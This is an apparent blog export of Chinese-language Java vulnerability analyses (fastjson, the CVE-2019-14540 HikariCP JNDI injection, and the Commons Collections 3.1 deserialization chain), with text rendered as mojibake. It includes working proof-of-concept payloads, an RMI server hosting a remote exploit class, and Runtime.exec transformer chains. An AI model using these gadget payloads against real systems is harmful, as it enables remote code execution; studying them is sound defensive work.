"&#123;\"@type\":\"test.User\",\"name\":\"passer6y\"&#125;"; //ÂºÄÂêØsetAutoTypeSupportÊîØÊåÅautoType ParserConfig.global.setAutoTypeSupport(true); //ÂèçÂ∫èÂàóÂåñÊàêUserÂØπË±° JSONObject user = JSON.parseObject(userInfo); &#125;&#125; ‰ªé‰∏ãÂõæÊàë‰ª¨Áü•ÈÅìÔºåËøôÈáåÊ≤°ÊúâËÆæÁΩÆageÂ±ûÊÄßÔºå‰ΩÜÊòØgetAgeÊñπÊ≥ïË¢´Ë∞ÉÁî®‰∫ÜÔºå‰∏îÂÖàË∞ÉÁî®setÊñπÊ≥ïÂêéË∞ÉÁî®getÊñπÊ≥ï„ÄÇ ÂÜçÂõûËøáÂ§¥Êù•ÁúãËøô‰∏™poc:1String poc = "&#123;\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"&#125;"; Ë∑üËøõËøô‰∏™ÁªÑ‰ª∂ÁöÑsetPrefixÊñπÊ≥ïÔºöÂÜçË∑ü‰∏Ä‰∏ãÊàêÂëòÂèòÈáèthis.prefixÔºöÊâÄ‰ª•ÊºèÊ¥ûÊàêÂõ†Â∞±ÊòæËÄåÊòìËßÅ‰∫ÜÔºåÈÄöËøáÁ¨¨‰∏ÄÊ≠•ÁöÑsetPrefixÁßçÂÖ•ÊàêÂëòÂèòÈáèthis.prefix‰∏∫ÊÅ∂ÊÑèrmiÊúçÂä°Âú∞ÂùÄÔºåÊé•ÁùÄfastjsonËá™Âä®Ë∞ÉÁî®ÂÖ®ÈÉ®getÊñπÊ≥ïÔºåÊ≤°ÊúâËÆæÁΩÆbaseContextÊàêÂëòÂèòÈáèÔºåËá™ÁÑ∂Â∞±Ëß¶Âèë‰∫ÜÔºö1(Context)this.getContext().lookup(this.prefix == null ? "" : this.prefix) ÈÇ£‰πàÈóÆÈ¢òÊù•‰∫ÜÔºåthis.getContext()ÊòØÊÄé‰πàËÆæÁΩÆÁöÑÂë¢Ôºü123public Context getContext() &#123; return this.context;&#125; Ëé∑Âèñ‰∫ÜÊàêÂëòÂèòÈáèthis.contextÔºåÂú®ÊûÑÈÄ†ÊñπÊ≥ï‰∏≠Êàë‰ª¨ÂèØ‰ª•ÁúãÂà∞‰∏ÄÈ°øÂ•óÂ®ÉÁöÑÊìç‰ΩúÔºåÊó†ÂèÇÊûÑÈÄ†ÂáΩÊï∞Ë∞ÉÁî®ÂçïÂèÇÊï∞ÊûÑÈÄ†ÂáΩÊï∞ÔºåË∞ÉÁî®ÂèåÂèÇÊï∞ÊûÑÈÄ†ÂáΩÊï∞ÔºåÂ∞Ünew InitialContext()ËµãÁªô‰∫ÜÊàêÂëòÂèòÈáèthis.contextÊúÄÁªàÂØºËá¥ÊºèÊ¥û‰∫ßÁîü„ÄÇ Á¥¢ÁÑ∂Êó†Âë≥Ôºå‰ªÖ‰ªÖÂØπgadget chainËøõË°å‰∫ÜÁÆÄÂçïÂàÜÊûêÔºåÂØπfastjsonÁöÑÂÖ≥ÈîÆ‰ª£Á†ÅÂàÜÊûêÊ¨†Áº∫ÔºåÊé•‰∏ãÈáåÁöÑ‰ªªÂä°Â∞±ÊòØÊêûÊáÇfastjsonÊºèÊ¥ûËß¶ÂèëÁöÑÊù°‰ª∂‰ª•ÂèäÂéüÁêÜ„ÄÇ ÊúÄÂêéÊºèÊ¥ûÂΩ±ÂìçfastjsonÁâàÊú¨Ôºöversion &lt;= 1.2.61„ÄÇ‰øÆÂ§ç‰πüÂ∞±ÊòØÂ§ö‰∫Ü‰∏™ÁªÑ‰ª∂ÈªëÂêçÂçï„ÄÇ]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>ÊºèÊ¥ûÂàÜÊûê</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-14540 ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÂàÜÊûê]]></title>
    <url>%2F2020%2F01%2F28%2FCVE-2019-14540%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[fastjsonÂÖ•Èó®‰∏ãËΩΩfastjsonÊúÄÊñ∞ÁâàjarÂåÖ‰∏ãËΩΩÔºåIdea Êñ∞Âª∫È°πÁõÆ-&gt;ÈÄâÊã©jdk1.7‚Äî&gt;ÈÄâÊã©File &gt; project structure &gt; Modules &gt; dependencies &gt; + JARS or directories -&gt;Âä†ËΩΩ‰∏ãËΩΩÁöÑÁªÑ‰ª∂ ÂÜô‰∏Ä‰∏™UserÁ±ªÔºåÊé•ÁùÄ‰ΩøÁî®fastjsonËß£Êûê‰∏ÄÊÆµjsonÊï∞ÊçÆÔºö1234567891011121314151617181920212223242526272829303132333435package test;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;import com.alibaba.fastjson.JSONObject;public class User &#123; private int age; private String name; public int getAge() &#123; System.out.println("getAgeÊñπÊ≥ïË¢´Ëá™Âä®Ë∞ÉÁî®ÔºÅ"); return age; &#125; public void setAge(int age) &#123; System.out.println("setAgeÊñπÊ≥ïË¢´Ëá™Âä®Ë∞ÉÁî®ÔºÅ"); this.age = age; &#125; public String getName() &#123; System.out.println("getNameÊñπÊ≥ïË¢´Ëá™Âä®Ë∞ÉÁî®ÔºÅ"); return name; &#125; public void setName(String name) &#123; System.out.println("setNameÊñπÊ≥ïË¢´Ëá™Âä®Ë∞ÉÁî®ÔºÅ"); this.name = name; &#125; public static void main(String[] args) &#123; //‰ΩøÁî®@typeÊåáÂÆöËØ•JSONÂ≠óÁ¨¶‰∏≤Â∫îËØ•ËøòÂéüÊàê‰ΩïÁßçÁ±ªÂûãÁöÑÂØπË±° String userInfo = "&#123;\"@type\":\"test.User\",\"name\":\"passer6y\", \"age\":18&#125;"; //ÂºÄÂêØsetAutoTypeSupportÊîØÊåÅautoType ParserConfig.global.setAutoTypeSupport(true); //ÂèçÂ∫èÂàóÂåñÊàêUserÂØπË±° JSONObject user = JSON.parseObject(userInfo); //User user = (User) JSON.parse(userInfo); Âè™‰ºöË∞ÉÁî®setXXÊñπÊ≥ï //System.out.println(user.getName()); &#125;&#125; Âú®‰ΩøÁî®JSON.parseObjectËß£ÊûêjsonÊó∂Ôºå‰ª£Á†Å‰∏≠ÁöÑsetXX„ÄÅgetXXÊñπÊ≥ïËá™Âä®Ë∞ÉÁî®ÔºåÂ¶ÇÊûúÂáΩÊï∞‰∏≠Â≠òÂú®‰∏Ä‰∫õÊïèÊÑüÊìç‰ΩúÔºåÂàôÂèØËÉΩÂØºËá¥ÊºèÊ¥û‰∫ßÁîü„ÄÇ JSON.parseÂè™‰ºöË∞ÉÁî®setXXÊñπÊ≥ïÔºå‰∏ç‰ºöËá™Âä®Ë∞ÉÁî®getXX Âè¶Â§ñÔºåÂ∞Üjson‰∏≠ÁöÑageÂÖÉÁ¥†Âà†Èô§ÂêéÔºå‰ΩøÁî®JSON.parseObjectÔºå‰ªçÁÑ∂‰ºöË∞ÉÁî®getAgeÊñπÊ≥ï„ÄÇ ‰πüÂ∞±ÊòØËØ¥parseObjectË∞ÉÁî®ÂÖ®ÈÉ®Â±ûÊÄßÁöÑgetXXÊñπÊ≥ïÔºåÂíåËÆæÁΩÆÂ±ûÊÄßÁöÑsetXXÊñπÊ≥ï ÊºèÊ¥ûÂ§çÁé∞ÂàÜÊûê10ÂàÜÈíüÔºåÂ§çÁé∞3Â∞èÊó∂ÔºåÁéØÂ¢ÉÊó†ÈôêÈááÂùë‚Ä¶ÔºàmavenÁúüÈ¶ô RMIÊúçÂä°Á´ØÊê≠Âª∫ËøôÈáå‰ΩøÁî®‰∫ÜRMIÂä®ÊÄÅÂä†ËΩΩËøúÁ®ãclassÊñá‰ª∂ÔºåÂèÇËÄÉÁ¨îËÆ∞ÔºöÊ∑±ÂÖ•ÁêÜËß£RMI&amp;JNDI ‰ΩøÁî®javacÂ∞Ü‰∏ãÈù¢‰ª£Á†ÅÁºñËØëÊàêclassÊñá‰ª∂ÔºåÊîæÂà∞webÊúçÂä°Âô®‰∏≠,ËøôÈáå‰ΩøÁî®nginx(https://127.0.0.1/Exploit.class)123456789101112131415public class Exploit &#123; public Exploit() &#123; try &#123; if (System.getProperty("os.name").toLowerCase().startsWith("win")) &#123; Runtime.getRuntime().exec("calc.exe"); &#125; else if (System.getProperty("os.name").toLowerCase().startsWith("mac")) &#123; Runtime.getRuntime().exec("open /Applications/Calculator.app"); &#125; else &#123; System.out.println("No calc for you!"); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; ÂÜçËµ∑‰∏Ä‰∏™RMIÊúçÂä°Á´ØÔºåÂä®ÊÄÅÂä†ËΩΩËøúÁ®ãclassÊñá‰ª∂:1234567891011121314151617181920212223import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import javax.naming.Reference; import com.sun.jndi.rmi.registry.ReferenceWrapper;public class server &#123; public static void main(String[] args) &#123; try &#123; //ÂàõÂª∫RMI RegistryÔºåÈªòËÆ§ÁõëÂê¨1099Á´ØÂè£ Registry registry = LocateRegistry.createRegistry(1099); String remote_class = "https://127.0.0.1/"; //ReferenceÂØπË±°‰ª£Ë°®Â≠òÂú®‰∫éJNDI‰ª•Â§ñÁöÑÂØπË±°ÁöÑÂºïÁî® Reference reference = new Reference("Exploit", "Exploit", remote_class); ReferenceWrapper re = new ReferenceWrapper(reference); //ÊääReferenceÂØπË±°ÁªëÂÆöÂà∞RegistryÔºåÂÆ¢Êà∑Á´ØÂèØ‰ª•ÈÄöËøáÂú®RegistryÊü•ÊâæExploitËé∑ÂèñÂà∞reÂØπË±° registry.bind("Exploit",re); System.out.println("RMIÊúçÂä°Â∑≤ÁªèÂêØÂä®...."); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; ÊºèÊ¥ûÁéØÂ¢ÉÊê≠Âª∫&amp;Â§çÁé∞ jdkÁâàÊú¨Ôºöjdk1.8.0_73 jacksonÁâàÊú¨Ôºö2.10.0 HikariCPÁâàÊú¨Ôºö3.3.1 fastjsonÁâàÊú¨Ôºö1.2.53ideaÂàõÂª∫mavenÈ°πÁõÆÔºåÂú®pom.xmlÊ∑ªÂä†‰æùËµñÔºö12345678910111213141516171819 &lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.10.0.pr1&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.zaxxer/HikariCP --&gt; &lt;dependency&gt; &lt;groupId&gt;com.zaxxer&lt;/groupId&gt; &lt;artifactId&gt;HikariCP&lt;/artifactId&gt; &lt;version&gt;3.3.1&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.53&lt;/version&gt;&lt;/dependencies&gt; jackson poc:12345678910import com.fasterxml.jackson.databind.ObjectMapper;public class test &#123; public static void main(String[] args) throws Exception &#123; String json = "[\"com.zaxxer.hikari.HikariConfig\",&#123;\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"&#125;]"; ObjectMapper objectMapper = new ObjectMapper(); objectMapper.enableDefaultTyping(); objectMapper.readValue(json,Object.class); &#125;&#125; fastjson poc:12345678910import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;public class fastjsonEXP &#123; public static void main(String[] args)&#123; ParserConfig.global.setAutoTypeSupport(true); JSON.parseObject("&#123;\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"&#125;"); &#125;&#125; ÊºèÊ¥ûÂàÜÊûê‰ªé‰∏äÊñá‰∏≠fastjsonÂÖ•Èó®ÈÉ®ÂàÜÊàë‰ª¨Áü•ÈÅìÔºåÂú®Ëß£ÊûêjsonÊï∞ÊçÆÁöÑÊó∂ÂÄô‰ºöËá™Âä®Ë∞ÉÁî®setXXÊñπÊ≥ïÔºåÂú®HikariCPËøô‰∏™ÁªÑ‰ª∂‰∏≠ÔºåHikariConfig.class‰∏≠ÂèØ‰ª•ÁúãÂà∞setMetricRegistryÊñπÊ≥ïË∞ÉÁî®‰∫ÜgetObjectOrPerformJndiLookupÊñπÊ≥ïÔºöË∑üËøõÂÖ∂‰∏≠ÔºåË∞ÉÁî®‰∫ÜInitialContext.lookup(object)ÂæàÊòéÊòæÁöÑjndi ReferenceÊ≥®ÂÖ•„ÄÇ ÊâÄ‰ª•Êàë‰ª¨Âú®ÊûÑÈÄ†pocÁöÑÊó∂ÂÄôÔºåÂà©Áî®fastjsonÁöÑ@typeÂä†ËΩΩËØ•ÂØπË±°com.zaxxer.hikari.HikariConfigÔºå‰ΩøÁî®metricRegistryÂ±ûÊÄßÔºåÂéªËß¶ÂèësetMetricRegistryÊñπÊ≥ïÔºåÊúÄÁªà‰Ωø‰πãÂä†ËΩΩÊàë‰ª¨ÊÅ∂ÊÑèÁöÑRMIÊúçÂä°Á®ãÂ∫è„ÄÇ1&#123;\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"&#125; ÂêåÊ†∑ÁöÑÔºåÂú®jackson‰∏≠‰πüÊúâËøôÊ†∑ÁöÑÈóÆÈ¢òÔºö1[\"com.zaxxer.hikari.HikariConfig\",&#123;\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"&#125;] ÊúÄÂêéÈÄöËøá‰∏äÈù¢ÁöÑÂàÜÊûêÔºåÊàë‰ª¨‰πüÂèØ‰ª•ÂèëÁé∞ÂÖ∂ÂÆûËøôÊòØÂ§öÁªÑ‰ª∂ÁªÑÂêàÂØºËá¥ÁöÑËøúÁ®ã‰ª£Á†ÅÊâßË°åÔºåÈúÄË¶ÅÁéØÂ¢É‰∏≠‰ΩøÁî®‰∫ÜfastjsonÊàñËÄÖjacksonÂ∫ìÔºåÂêåÊó∂Ëøò‰ΩøÁî®‰∫ÜÁ¨¨‰∏âÊñπÁªÑ‰ª∂HikariCPÂØºËá¥ÁöÑÔºåËÄåÂÆòÊñπÁöÑ‰øÆÂ§ç‰πüÂè™ÊòØÂ∞ÜËØ•Êâ©Â±ïÊ∑ªÂä†Ëøõ‰∫ÜÈªëÂêçÂçï(fastjson-blacklist„ÄÅjackson‰øÆÂ§çcommit)„ÄÇ ÂèÇËÄÉÊñáÁ´†Ôºö curz0n:CVE-2019-14540ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÂàÜÊûê&amp;Â§çÁé∞ b1ue:Java ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂßãÊú´Ôºà4Ôºâ‚Äî jackson]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>ÊºèÊ¥ûÂàÜÊûê</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaÂÖ•ÂùëÔºöApache-Commons-Collections-3.1 ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂàÜÊûê]]></title>
    <url>%2F2020%2F01%2F24%2FApache-Commons-Collections-3.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[ÁéØÂ¢ÉÊê≠Âª∫ÁªÑ‰ª∂‰∏ãËΩΩÔºöhttps://mvnrepository.com/artifact/commons-collections/commons-collections/3.1 Idea Êñ∞Âª∫È°πÁõÆ-&gt;ÈÄâÊã©jdk1.7‚Äî&gt;ÈÄâÊã©File &gt; project structure &gt; Modules &gt; dependencies &gt; + JARS or directories -&gt;Âä†ËΩΩ‰∏ãËΩΩÁöÑÁªÑ‰ª∂ ÊºèÊ¥ûÂ§çÁé∞poc:123456789101112131415161718192021222324252627282930import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class EvalObject &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"open /Applications/Calculator.app/"&#125;) &#125;; //Â∞ÜtransformersÊï∞ÁªÑÂ≠òÂÖ•ChaniedTransformerËøô‰∏™ÁªßÊâøÁ±ª Transformer transformerChain = new ChainedTransformer(transformers); //ÂàõÂª∫MapÂπ∂ÁªëÂÆötransformerChain Map innerMap = new HashMap(); innerMap.put("value", "value"); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //Ëß¶ÂèëÊºèÊ¥û Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); onlyElement.setValue("foobar"); &#125; ÊºèÊ¥ûÂàÜÊûêstep1ÊºèÊ¥ûÁÇπÂú®/commons-collections-3.1-sources.jar!/org/apache/commons/collections/functors/InvokerTransformer.java1234567891011121314151617181920212223242526public class InvokerTransformer implements Transformer, Serializable &#123; //105Ë°å public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; &#125; public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist"); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed"); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex); &#125; &#125;&#125; ÈÄöËøáÂÆûÁé∞/commons-collections-3.1-sources.jar!/org/apache/commons/collections/Transformer.java TransformerÊé•Âè£ÔºåInvokerTransformerÊûÑÈÄ†ÊñπÊ≥ïÂú®ÂÆû‰æãÂåñÁöÑÊó∂ÂÄô‰º†ÂÖ•ÂèÇÊï∞ÂáΩÊï∞ÊñπÊ≥ïÂêç‰ª•ÂèäÂèÇÊï∞ÂêçÔºåtransformÊñπÊ≥ï‰ΩøÁî®javaÂèçÂ∞ÑÊú∫Âà∂Âæó‰ª•Ë∞ÉÁî®‰ªªÊÑèÊñπÊ≥ï„ÄÇTransformerÊé•Âè£:123public interface Transformer &#123; public Object transform(Object input);&#125; JavaÂèçÂ∞ÑÊú∫Âà∂Âç≥ÂèÇÊï∞‰º†ÂÖ•‰∏Ä‰∏™ÂØπË±°ÔºåÁÑ∂ÂêéÈÄöËøágetClass„ÄÅgetMethodÁ≠âÊñπÊ≥ïÂéªËé∑ÂèñÂÖ∂ÊâÄÂ±ûÁöÑÁ±ª„ÄÅÊâÄÊã•ÊúâÁöÑÂØπË±°„ÄÇ Âú®Java‰∏≠‰∏ÄÂàáÁöÜÂØπË±°ÔºåË∞ÉÁî®Á≥ªÁªüÂëΩ‰ª§ÁöÑ‰ª£Á†ÅÈÄöÂ∏∏‰∏∫Ôºö1Runtime.getRuntime().exec("open -a Calculator"); ÂèØ‰ª•ÈÄöËøáÊûÑÈÄ†ËøôÊÆµ‰ª£Á†ÅÂÆûÁé∞ÂëΩ‰ª§ÊâßË°åÔºö12345678public class EvalObject &#123; public static void main(String[] args) throws Exception &#123; InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open -a Calculator"&#125;); invokerTransformer.transform(Runtime.getRuntime()); &#125;&#125; ‰ΩÜÊòØÊàë‰ª¨Áü•ÈÅìÂèçÂ∫èÂàóÂåñÂêé‰∏ÄËà¨Âè™ÈúÄË¶ÅÊâßË°åreadObjectÂáΩÊï∞Âç≥ÂèØÔºåÂ¶ÇÊûúÁõ¥Êé•Â∫èÂàóÂåñinvokerTransformerÂØπË±°ÔºåÈÇ£‰πàreadObject‰πãÂêéÁöÑÂØπË±°ËøòÈúÄË¶Å‰∏ªÂä®Ë∞ÉÁî®transform(Runtime.getRuntime())ÂáΩÊï∞ÊâçËÉΩÂæó‰ª•ÂëΩ‰ª§ÊâßË°åÔºåÊòæÁÑ∂ÊòØ‰∏çÂ§™Áé∞ÂÆûÁöÑ„ÄÇdemo:12345678910111213141516171819202122232425262728293031323334import java.io.*;import java.lang.Runtime;import org.apache.commons.collections.functors.InvokerTransformer;public class test2 &#123; public static void main(String[] args) throws Exception &#123; InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]&#123; String.class&#125;, new Object[] &#123;"open -a Calculator"&#125;); serialize(invokerTransformer); // ÂèçÂ∫èÂàóÂåñÂÆå‰∫ÜËøòÂæóË∞ÉÂØπË±°ÁöÑtransformÊñπÊ≥ï InvokerTransformer obj = (InvokerTransformer) unserialize(); obj.transform(Runtime.getRuntime()); &#125; public static void serialize(InvokerTransformer obj)&#123; try &#123; ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test.ser")); os.writeObject(obj); os.close(); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static Object unserialize()&#123; try &#123; ObjectInputStream is = new ObjectInputStream(new FileInputStream("test.ser")); return is.readObject(); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; return null; &#125;&#125; step2: ÂèçÂ∞ÑÈìæÊûÑÈÄ†ËøôÊÑèÂë≥ÁùÄRuntime.getRuntime()ÁöÑË∞ÉÁî®‰πüÈúÄË¶ÅÊàë‰ª¨ÈÄöËøáÂèçÂ∞ÑÊù•ËøõË°åË∞ÉÁî®ÔºåËÄåInvokerTransformerÁöÑtansformÂáΩÊï∞‰∏ÄÊ¨°Âè™ËÉΩËøõË°å‰∏ÄÊ¨°ÂèçÂ∞ÑÔºåËøôÂ∞±ÈúÄË¶ÅÊàë‰ª¨ÊûÑÈÄ†‰∏Ä‰∏™ÂèçÂ∞ÑÈìæÔºåÊúÄÁªàË∞ÉÁî®execÂáΩÊï∞ËøõË°åÂëΩ‰ª§ÊâßË°å„ÄÇ Âú® /commons-collections-3.1-sources.jar!/org/apache/commons/collections/functors/ChainedTransformer.java ‰∏≠Êèê‰æõ‰∫ÜÊàë‰ª¨ÊûÑÈÄ†‰∏Ä‰∏™ÂáΩÊï∞ÂØπË±°Ë∞ÉÁî®ÈìæÁöÑ‰∏Ä‰∏™ÊñπÊ≥ïÔºö1234567891011121314public class ChainedTransformer implements Transformer, Serializable &#123; // 109Ë°å public ChainedTransformer(Transformer[] transformers) &#123; super(); iTransformers = transformers; &#125; public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object); &#125; return object; &#125;&#125; ÁªôChainedTransformerÊñπÊ≥ï‰º†ÈÄí‰∏Ä‰∏™Êï∞ÁªÑÔºåÂú®transformÊñπÊ≥ïÈáåÈÅçÂéÜË∞ÉÁî®ÂÖ∂transformÊñπÊ≥ïÔºåÂπ∂Â∞ÜËøîÂõûÁöÑÁªìÊûú‰Ωú‰∏∫‰∏ã‰∏ÄÊ¨°transformÂáΩÊï∞ÁöÑÂèÇÊï∞„ÄÇ Ê≠§Êó∂ÂèØ‰ª•ÊûÑÈÄ†Âá∫ËøôÊ†∑‰∏Ä‰∏™pocÔºö123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package test2;import java.io.*;import java.lang.Runtime;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;public class test2 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[] &#123; //‰º†ÂÖ•RuntimeÁ±ª new ConstantTransformer(Runtime.class), //ÂèçÂ∞ÑË∞ÉÁî®getMethodÊñπÊ≥ïÔºåÁÑ∂ÂêégetMethodÊñπÊ≥ïÂÜçÂèçÂ∞ÑË∞ÉÁî®getRuntimeÊñπÊ≥ïÔºåËøîÂõûRuntime.getRuntime()ÊñπÊ≥ï new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;), //ÂèçÂ∞ÑË∞ÉÁî®invokeÊñπÊ≥ïÔºåÁÑ∂ÂêéÂèçÂ∞ÑÊâßË°åRuntime.getRuntime()ÊñπÊ≥ïÔºåËøîÂõûRuntimeÂÆû‰æãÂåñÂØπË±° new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //ÂèçÂ∞ÑË∞ÉÁî®execÊñπÊ≥ï new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open -a Calculator"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); serialize(transformerChain); // ÈÄöËøáËøõ‰∏ÄÊ≠•ÊûÑÈÄ†ÂèçÂ∞ÑÈìæÔºåËøôÈáåÁöÑtransform‰º†ÈÄí‰∏Ä‰∏™Á©∫ÂèÇÊï∞Âç≥ÂèØ„ÄÇ Transformer transformer = (Transformer) unserialize(); transformer.transform(""); &#125; public static void serialize(Transformer obj)&#123; try &#123; ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test.ser")); os.writeObject(obj); os.close(); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static Object unserialize()&#123; try &#123; ObjectInputStream is = new ObjectInputStream(new FileInputStream("test.ser")); return is.readObject(); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; return null; &#125;&#125; Âú®TransformerÊï∞ÁªÑÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†‰∏≠Áî®Âà∞‰∫ÜConstantTransformerÁ±ªÔºö1234567891011public class ConstantTransformer implements Transformer, Serializable &#123; // 64Ë°å public ConstantTransformer(Object constantToReturn) &#123; super(); iConstant = constantToReturn; &#125; public Object transform(Object input) &#123; return iConstant; &#125;&#125; ÈÄöËøáÂàùÂßãÂåñÂØπË±°‰º†ÂÖ•Runtime.classÁ±ª‰Ωú‰∏∫ÂèÇÊï∞ÔºåÁÑ∂ÂêéÂú®ChainedTransformerÁ±ªÈÅçÂéÜÊï∞ÁªÑË∞ÉÁî®ÂÖ∂ ConstantTransformerÁöÑtransformÊñπÊ≥ïËøîÂõûRuntimeÁ±ª„ÄÇ ‰ªétransformer.transform(&quot;&quot;);‰∏ãÊñ≠ÁÇπË∑üËøõÔºö ÈÅçÂéÜÊï∞ÁªÑÔºåÁ¨¨‰∏ÄÊ¨°ËøõÂÖ•ConstantTransformerÁöÑtransformÂáΩÊï∞Ôºö ConstantTransformerÁöÑtransformËøîÂõûÂú®ÂÆû‰æãÂåñÊó∂‰º†ÂÖ•ÁöÑRuntimeÁ±ªÔºö Á¨¨‰∫åÊ¨°Âæ™ÁéØÔºåÂ∞ÜÁ¨¨‰∏ÄÊ¨°ËøîÂõûÁöÑRuntimeÁ±ª‰Ωú‰∏∫ÂèÇÊï∞ÔºåÂ∏¶ÂÖ•Á¨¨‰∫åÊ¨°InvokerTransformerÁ±ªÁöÑtransformÂáΩÊï∞ÂèÇÊï∞‰∏≠ÔºöËøôÈáåÈÄöËøájavaÂèçÂ∞ÑÊú∫Âà∂Ôºå‰ªéRuntimeÁ±ªÊâæÂà∞ÂÖ∂getRuntimeÊñπÊ≥ïÔºåËøîÂõûRuntime.getRuntime()ÊñπÊ≥ïÔºå‰Ωú‰∏∫‰∏ãÊ¨°Âæ™ÁéØÁöÑÂèÇÊï∞„ÄÇ Á¨¨‰∏âÊ¨°Âæ™ÁéØÂÜçÊ¨°ÈÄöËøáInvokerTransformerÁ±ªÁöÑtransformÊñπÊ≥ïÔºåÈÄöËøáÂèçÂ∞ÑË∞ÉÁî®invokeÊñπÊ≥ïÔºåÁúüÊ≠£ÁöÑÊâßË°ågetRuntimeÂáΩÊï∞Âπ∂ËøîÂõûRuntimeÂÆû‰æã Âú®Á¨¨ÂõõËΩÆ‰∏≠Êàë‰ª¨ÂèØ‰ª•ÁúãÂà∞objectÂèÇÊï∞ÂèòÊàê‰∫ÜRuntimeÂØπË±°ÔºåÂπ∂‰∏îÈÄöËøáÂèçÂ∞ÑË∞ÉÁî®execÂáΩÊï∞Êù•ËøõË°åÂëΩ‰ª§ÊâßË°åÔºöÊúÄÂêéÊâßË°åÂëΩ‰ª§Ôºö 